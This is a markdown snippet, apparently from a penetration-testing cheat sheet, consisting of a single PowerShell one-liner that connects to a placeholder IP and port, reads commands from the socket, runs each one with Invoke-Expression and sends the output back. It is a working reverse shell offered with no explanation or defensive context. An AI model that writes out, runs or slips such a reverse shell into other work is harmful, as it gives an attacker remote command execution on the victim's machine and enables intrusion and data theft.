### One liner
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);$stream = $client.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.AutoFlush = $true;$reader = new-object System.IO.StreamReader($stream);while($true) {$cmd = $reader.ReadLine();$output = Invoke-Expression $cmd;$writer.WriteLine($output);};$client.Close();"
```
